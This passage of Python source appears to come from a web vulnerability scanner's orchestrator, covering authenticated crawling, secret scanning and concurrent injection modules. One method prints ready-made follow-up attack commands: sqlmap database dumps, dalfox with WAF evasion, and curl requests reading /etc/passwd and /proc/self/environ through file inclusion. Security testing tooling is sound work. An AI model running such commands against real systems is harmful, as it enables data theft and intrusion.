        if not is_available("wpscan"):
            if not self.config.get("quiet"):
                print(self._c(
                    "   [i] wpscan not found — install: gem install wpscan",
                    _DIM,
                ))
            return
        if not self.config.get("quiet"):
            print(self._c("   [~] Launching wpscan WordPress audit...", _YELLOW))
        runner = WPScanRunner(self.config)
        for f in runner.run(url):
            self._add_finding(f)

    def _suggest_follow_up(self, url: str) -> None:
        """Print next-step tool commands based on what the scan found."""
        if not self.findings:
            return

        sqli = [f for f in self.findings if "sql injection" in f.vuln_type.lower() and "[sqlmap]" not in f.vuln_type]
        xss  = [f for f in self.findings if "cross-site" in f.vuln_type.lower() and "[dalfox]" not in f.vuln_type]
        cves = [f for f in self.findings if "known cve" in f.vuln_type.lower()]
        lfi  = [f for f in self.findings if "file inclusion" in f.vuln_type.lower() or "traversal" in f.vuln_type.lower()]

        lines = []

        if sqli:
            f = sqli[0]
            p = f.parameter or "PARAM"
            dbms_hint = ""
            for db in ("mysql", "mssql", "postgresql", "oracle", "sqlite"):
                if db in (f.evidence or "").lower() or db in (f.details or "").lower():
                    dbms_hint = f" --dbms {db}"
                    break
            method_hint = ""
            data_hint = ""
            if f.method.upper() == "POST":
                method_hint = " --method POST"
                data_hint = f" --data '{p}=*'"
            lines.append("# SQLi confirmed — enumerate with sqlmap:")
            lines.append(
                f"$ sqlmap -u '{f.url}' -p {p}{method_hint}{data_hint}{dbms_hint} --batch --dbs"
            )
            lines.append(
                f"$ sqlmap -u '{f.url}' -p {p}{method_hint}{data_hint}{dbms_hint} --batch -D <DB> --tables"
            )
            lines.append(
                f"$ sqlmap -u '{f.url}' -p {p}{method_hint}{data_hint}{dbms_hint} --batch -D <DB> -T <TABLE> --dump"
            )
            lines.append("")

        if xss:
            f = xss[0]
            p = f.parameter or "q"
            if f.method.upper() == "POST":
                lines.append("# XSS confirmed (POST) — verify with dalfox:")
                form_data = self._form_targets[0]["params"] if self._form_targets else {p: ""}
                data_str = "&".join(f"{k}={v}" for k, v in form_data.items())
                lines.append(
                    f"$ dalfox url '{f.url}' --data '{data_str}' --waf-evasion"
                )
            else:
                lines.append("# XSS confirmed — verify with dalfox:")
                lines.append(f"$ dalfox url '{f.url}' --waf-evasion")
            lines.append("")

        if cves:
            lines.append("# Known CVEs — scan with nuclei:")
            lines.append(f"$ nuclei -u '{url}' -t ~/nuclei-templates/ -tags cve -severity high,critical -j")
            lines.append(f"$ searchsploit {cves[0].evidence.split('/')[0] if cves else 'service'}")
            lines.append("")

        if lfi:
            f = lfi[0]
            lines.append("# LFI confirmed — try RFI + log poisoning:")
            lines.append(f"$ curl -s '{f.url}?{f.parameter}=/etc/passwd'")
            lines.append(f"$ curl -s '{f.url}?{f.parameter}=/proc/self/environ'")
            lines.append("")

        if not lines:
            return

        print(self._c("   +--- Suggested next steps ---", _CYAN + _BOLD))
        for line in lines:
            if line.startswith("$"):
                print(self._c(f"   {line}", _GREEN + _BOLD))
            elif line.startswith("#"):
                print(self._c(f"   {line}", _CYAN))
            elif line == "":
                print()
            else:
                print(self._c(f"   {line}", _DIM))
        print(self._c("   +----------------------------", _CYAN + _BOLD))

    def _passive_secret_scan(self, url: str, baseline_resp) -> None:
        """Scan the page body + its same-origin <script src> bundles for secrets.

        Free of injection false positives (purely passive). Decoding of
        base64 / atob() wrapped values is handled inside scanner.secrets.
        """
        from urllib.parse import urljoin
        from .secrets import scan_pages

        class _Page:
            __slots__ = ("url", "body", "content_type")
            def __init__(self, u, b, c):
                self.url, self.body, self.content_type = u, b, c

        pages = [_Page(url, baseline_resp.text,
                       baseline_resp.headers.get("Content-Type", "text/html"))]

        target_host = urlparse(url).hostname or ""
        seen_src = set()
        for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']',
                             baseline_resp.text, re.IGNORECASE):
            src = urljoin(url, m.group(1))
            if src in seen_src or (urlparse(src).hostname or "") != target_host:
                continue
            seen_src.add(src)
            try:
                r = self.http.get(src)
            except Exception:
                r = None
            if r is not None:
                pages.append(_Page(src, r.text,
                                   r.headers.get("Content-Type", "application/javascript")))

        for f in scan_pages(pages):
            key = self._finding_key(f)
            if key not in self._seen_keys:
                self._seen_keys.add(key)
                self.findings.append(f)

    # ------------------------------------------------------------------
    # Orchestrated (authenticated, crawl-aware) phase
    # ------------------------------------------------------------------

    def _orchestrated_enabled(self) -> bool:
        """The heavy authenticated phase (login + app crawl + orchestrated
        checks) only runs when explicitly requested — either auth credentials
        were supplied or config['orchestrated'] is set — so default scans keep
        their existing behaviour and cost."""
        return bool(
            self.config.get("auth_username")
            or self.config.get("orchestrated")
        )

    @staticmethod
    def _finding_key(f: Finding):
        """Dedup key for a finding.

        Response-header issues (missing/weak headers, server banner) are a
        property of the host, not of any single URL, so they collapse to one
        finding per (type, host) — otherwise an authenticated crawl emits one
        copy per page. Everything else keys on (type, url, param, payload).
        """
        if f.parameter == "(response headers)":
            return (f.vuln_type, urlparse(f.url).netloc)
        return (f.vuln_type, f.url, f.parameter, f.payload)

    def _add_finding(self, f: Finding) -> None:
        """Append *f* unless an identical finding was already recorded."""
        key = self._finding_key(f)
        if key not in self._seen_keys:
            self._seen_keys.add(key)
            self.findings.append(f)

    def _make_client(self, cookies: Dict) -> HTTPClient:
        """Factory used by the crawler and orchestrated checks to build clients
        carrying a chosen identity's cookies (or none, for anonymous probes)."""
        return HTTPClient(
            headers=self.config.get("headers", {}),
            cookies=cookies or {},
            proxy=self.config.get("proxy"),
            timeout=self.config.get("timeout", 10),
            follow_redirects=self.config.get("follow_redirects", True),
            rate_limiter=self._rate_limiter,
        )

    def _authenticate(self) -> None:
        """Log in with the configured credentials and reuse the session cookie
        everywhere (config["cookies"] + self.http). A second credential, if
        given, is captured separately for two-identity BOLA testing."""
        from urllib.parse import urljoin
        from .auth import Authenticator, Credential

        self._authenticator = None
        self._secondary_cookies: Dict = {}

        user = self.config.get("auth_username")
        pw = self.config.get("auth_password") or ""
        login_url = self.config.get("auth_login_url") or "/login"
        if not user:
            return
        login_abs = login_url if login_url.startswith("http") else urljoin(self.config["url"], login_url)

        creds = [Credential(user, pw)]
        u2, p2 = self.config.get("auth_username2"), self.config.get("auth_password2")
        if u2:
            creds.append(Credential(u2, p2 or ""))

        auth = Authenticator(
            login_abs, creds,
            timeout=self.config.get("timeout", 10),
            proxy=self.config.get("proxy"),
            extra_headers=self.config.get("headers"),
        )
        cookies = auth.login()
        self._authenticator = auth
        if len(creds) > 1:
            self._secondary_cookies = auth.session_cookies_for(1)

        if cookies:
            self.config["cookies"] = {**self.config.get("cookies", {}), **cookies}
            try:
                self.http._session.cookies.update(cookies)
            except Exception:
                pass
            logger.info("Authenticated as %r — session reused for the whole scan.", user)
            if not self.config.get("quiet"):
                print(self._c(f"   [+] Authenticated as {user!r} — scanning with a live session", _GREEN))
        else:
            logger.warning("Authentication failed for %r — continuing unauthenticated.", user)

    def _orchestrated_crawl(self, url: str, target_param) -> List[Dict]:
        """Crawl the authenticated surface; return new injectable targets and
        stash the full CrawlResult for the orchestrated checks. Also runs the
        passive secret scan over every crawled page/asset."""
        from .crawler import crawl
        client = self._make_client(self.config.get("cookies", {}))
        try:
            result = crawl(
                url, client,
                max_pages=self.config.get("crawl_max_pages", 60),
                max_depth=self.config.get("crawl_max_depth", 3),
            )
        except Exception as exc:
            logger.debug("Orchestrated crawl failed: %s", exc)
            self._crawl_result = None
            return []

        self._crawl_result = result
        if not self.config.get("quiet"):
            print(self._c(
                f"   [+] Crawl: {len(result.pages)} page(s), {len(result.targets)} target(s), "
                f"{len(result.forms)} form(s)", _CYAN,
            ))

        # Secret scan across everything the crawler fetched (catches /static/*.js).
        try:
            from .secrets import scan_pages
            for f in scan_pages(result.pages):
                self._add_finding(f)
        except Exception as exc:
            logger.debug("Crawl secret scan failed: %s", exc)

        # Don't pour the full per-param module battery onto auth endpoints:
        # fuzzing /register creates junk accounts, /login churns sessions, and
        # the orchestrated auth-bypass check already covers login forms. This
        # keeps the scan fast and side-effect-free.
        _SKIP_PATHS = ("/login", "/register", "/signup", "/logout", "/signin")
        new_targets = []
        for t in result.targets:
            if target_param and t["param_name"] != target_param:
                continue
            path = urlparse(t["url"]).path.lower()
            if any(s in path for s in _SKIP_PATHS):
                continue
            new_targets.append(t)
        return new_targets

    def _run_active_checks_phase(self, url: str) -> None:
        """Build the ActiveContext and run every orchestrated check.

        A local OAST listener is started for the duration so the blind /
        second-order checks (e.g. stored XSS that only fires in an admin's
        browser) can confirm out-of-band callbacks. It's torn down afterwards.
        """
        from .active_checks import ActiveContext, run_active_checks

        oast = None
        try:
            from .oast import OASTListener
            oast = OASTListener(host=self.config.get("oast_host", "127.0.0.1")).start()
        except Exception as exc:
            logger.debug("OAST listener unavailable: %s", exc)

        parsed = urlparse(url)
        ctx = ActiveContext(
            base_url=f"{parsed.scheme}://{parsed.netloc}",
            crawl=self._crawl_result,
            make_client=self._make_client,
            primary_cookies=self.config.get("cookies", {}),
            secondary_cookies=getattr(self, "_secondary_cookies", {}),
            auth=getattr(self, "_authenticator", None),
            oast=oast,
            config=self.config,
        )
        try:
            for f in run_active_checks(ctx):
                self._add_finding(f)
        finally:
            if oast is not None:
                oast.stop()

    def _build_targets(
        self, url, method, data_string, target_param,
    ) -> List[Dict]:
        targets: List[Dict] = []

        if method == "GET":
            params = extract_params_from_url(url)
            base = get_base_url(url)
            for name in params:
                if target_param and name != target_param:
                    continue
                targets.append(
                    {"url": base, "method": "GET", "params": params, "param_name": name}
                )

        elif method == "POST":
            params = parse_post_data(data_string)
            if not params:
                logger.debug("POST selected but --data is empty -- will try form crawl.")
            for name in params:
                if target_param and name != target_param:
                    continue
                targets.append(
                    {"url": url, "method": "POST", "params": params, "param_name": name}
                )

        # Path-based IDOR: REST URLs like /api/orders/2 carry the object id in the
        # path, not a query/POST param — so without this no target is built and the
        # (capable) IDOR module never runs. Synthesize one path-only target; it is
        # restricted to the IDOR module in _scan_target to avoid spurious injections.
        if not targets and _ID_PATH_SEG_RE.search(urlparse(url).path):
            base = get_base_url(url)
            targets.append({
                "url": base,
                "method": method,
                "params": parse_post_data(data_string) if method == "POST" else {},
                "param_name": "(path id)",
                "path_only": True,
            })

        return targets

    def _js_crawl(self, url: str, target_param, existing_targets: List[Dict]) -> List[Dict]:
        """Run the Playwright JS crawler and return new injectable targets.

        Only targets whose hostname matches the original target (or is a
        subdomain of it) are returned.  External domains intercepted by the
        crawler (e.g. CDN calls, Firebase/Google APIs) are silently skipped to
        prevent false positives and out-of-scope testing.
        """
        from .js_crawler import js_crawl
        existing_keys = {(t["url"], t["method"], t["param_name"]) for t in existing_targets}

        target_host = urlparse(url).hostname or ""

        def _in_scope(target_url: str) -> bool:
            """Return True if *target_url* is on the same host or a subdomain."""
            h = urlparse(target_url).hostname or ""
            return h == target_host or h.endswith("." + target_host)

        # Pass cookies as raw string for Playwright context
        cookies_dict = self.config.get("cookies", {})
        cookies_raw = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())

        js_cfg = {
            "headers": self.config.get("headers", {}),
            "cookies_raw": cookies_raw,
            "proxy": self.config.get("proxy"),
        }

        all_js = js_crawl(url, js_cfg, timeout=self.config.get("timeout", 20))

        new_targets = []
        skipped_external = 0
        for t in all_js:
            if not _in_scope(t["url"]):
                skipped_external += 1
                logger.debug(
                    "JS-crawl: skipping out-of-scope URL %s (target host: %s)",
                    t["url"], target_host,
                )
                continue
            if target_param and t["param_name"] != target_param:
                continue
            key = (t["url"], t["method"], t["param_name"])
            if key not in existing_keys:
                existing_keys.add(key)
                new_targets.append(t)

        if skipped_external:
            logger.info(
                "JS-crawl: skipped %d out-of-scope URL(s) (external domains).",
                skipped_external,
            )
        if new_targets:
            param_names = sorted({t["param_name"] for t in new_targets})
            logger.info(
                "JS-crawl: found %d new injectable field(s): %s",
                len(new_targets), param_names,
            )
        return new_targets

    def _crawl_forms(self, url, baseline_resp, target_param) -> List[Dict]:
        """Parse HTML forms from *baseline_resp* and return injectable targets.

        Forms whose action points to a different domain than the original target
        are skipped (scope enforcement — same rule as JS-crawl).
        """
        try:
            forms = extract_forms(baseline_resp.text, url)
        except Exception as exc:
            logger.debug("Form extraction error: %s", exc)
            return []

        if not forms:
            return []

        logger.info(
            "Auto-crawl: found %d form(s) -- testing their fields automatically.",
            len(forms),
        )

        target_host = urlparse(url).hostname or ""

        targets = []
        for form in forms:
            action = form["action"]
            method = form["method"]

            # Skip forms that submit to a different domain
            action_host = urlparse(action).hostname or ""
            if action_host and action_host != target_host and not action_host.endswith("." + target_host):
                logger.debug(
                    "Auto-crawl: skipping out-of-scope form action %s (target host: %s)",
                    action, target_host,
                )
                continue

            params = {
                inp["name"]: inp["value"]
                for inp in form["inputs"]
                if inp["name"]
            }
            if not params:
                continue

            logger.info(
                "  Form: [%s] %s  fields=%s",
                method, action, list(params.keys()),
            )

            for name in params:
                if target_param and name != target_param:
                    continue
                t = {
                    "url": action,
                    "method": method,
                    "params": params,
                    "param_name": name,
                    "is_form": True,
                }
                targets.append(t)

            # Track full form context for ext-tool post-processing (sqlmap/dalfox need --data)
            if params:
                self._form_targets.append({
                    "url": action,
                    "method": method,
                    "params": params,
                })

        return targets

    def _scan_target(self, target: Dict) -> None:
        url = target["url"]
        method = target["method"]
        params = target["params"]
        param_name = target["param_name"]

        logger.info("  Testing param=%r [%s]", param_name, method)
        if not self.config.get("quiet", False):
            print(self._c(f"   ├─ param: ", _DIM) + self._c(f"{param_name!r}", _CYAN + _BOLD)
                  + self._c(f"  [{method}]", _DIM))

        # Injection-only modules — skipped on static/CDN targets.
        # Form targets are exempt: a form existing on the page proves server-side
        # processing. The static check used random field names; the real form
        # fields may trigger different server code.
        # Note: domxss is intentionally NOT here — DOM XSS lives in client-side
        # JS and is the ONE class that matters most on static/CDN SPA targets.
        _INJECTION_MODULES = {
            "sqli", "xss", "lfi", "cmdi", "ssti", "crlf",
            "redirect", "jwt", "ssrf", "xxe", "bypass403", "prototype",
        }
        static = getattr(self, "_static_target", False) and not target.get("is_form")

        # Each module gets its own HTTPClient so they can scan in parallel
        # without sharing state (e.g. redirect following toggle).
        # The rate limiter IS shared -- it's the single global throttle.
        def _run_module(module_cls):
            http_copy = HTTPClient(
                headers=self.config.get("headers", {}),
                cookies=self.config.get("cookies", {}),
                proxy=self.config.get("proxy"),
                timeout=self.config.get("timeout", 10),
                follow_redirects=self.config.get("follow_redirects", True),
                rate_limiter=self._rate_limiter,
            )
            module = module_cls(http_copy, self.config)
            return module.scan_parameter(url, method, params, param_name)

        # Run modules concurrently for speed
        # On static/CDN targets, skip injection modules to avoid false positives
        active_classes = [
            cls for cls in self.module_classes
            if not (static and cls.NAME in _INJECTION_MODULES)
        ]
        if static and len(active_classes) < len(self.module_classes):
            skipped = [cls.NAME for cls in self.module_classes if cls not in active_classes]
            logger.debug("Static target: skipping injection modules %s", skipped)

        # Synthetic path-only targets exist solely to drive path-based IDOR;
        # don't fuzz the placeholder param with the other modules.
        if target.get("path_only"):
            active_classes = [cls for cls in active_classes if cls.NAME == "idor"]

        max_workers = self.config.get("threads", _DEFAULT_WORKERS)
        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = {
                pool.submit(_run_module, cls): cls.NAME
                for cls in active_classes
            }
            try:
                total_mods = len(futures)
                done_count = 0
                for future in as_completed(futures):
                    mod_name = futures[future]
                    done_count += 1
                    try:
                        new_findings = future.result()
                    except Exception as exc:
                        logger.debug("Module %s error: %s", mod_name, exc)
                        continue
                    for f in new_findings:
                        key = self._finding_key(f)
                        if key in self._seen_keys:
                            continue
                        self._seen_keys.add(key)
                        logger.info(
                            "    [VULN] %s  param=%r  confidence=%s",
                            f.vuln_type, f.parameter, f.confidence,
                        )
                        # Print finding inline during scan (overwrite progress bar first)
                        if not self.config.get("quiet", False):
                            if sys.stdout.isatty():
                                sys.stdout.write("\r" + " " * 70 + "\r")
                            _conf_colors = {"high": _RED, "medium": _YELLOW, "low": _CYAN}
                            _c = _conf_colors.get(f.confidence, _CYAN)
                            print(self._c(
                                f"   │  [!] {f.vuln_type} — {f.parameter!r} "
                                f"[{f.confidence.upper()}]",
                                _c + _BOLD,
                            ))
                        self.findings.append(f)
                    # Inline progress (overwrite same line)
                    if not self.config.get("quiet", False) and sys.stdout.isatty():
                        pct = int(done_count / total_mods * 20)
                        bar = "█" * pct + "░" * (20 - pct)
                        sys.stdout.write(
                            f"\r   │  [{bar}] {done_count}/{total_mods} {mod_name}   "
                        )
                        sys.stdout.flush()
                # Clear progress line and close the param block
                if not self.config.get("quiet", False):
                    if sys.stdout.isatty():
                        sys.stdout.write("\r" + " " * 72 + "\r")
                        sys.stdout.flush()
                    print(self._c(f"   │  done ({total_mods} modules)", _DIM))
            except KeyboardInterrupt:
                # Cancel futures that haven't started yet
                for fut in futures:
                    fut.cancel()
                # Collect results from futures that already finished
                for fut, mod_name in futures.items():
                    if fut.done() and not fut.cancelled():
                        try:
                            for f in fut.result():
                                key = self._finding_key(f)
                                if key not in self._seen_keys:
                                    self._seen_keys.add(key)
                                    self.findings.append(f)
                        except Exception:
                            pass
                raise  # re-raise so the outer handler in run() catches it
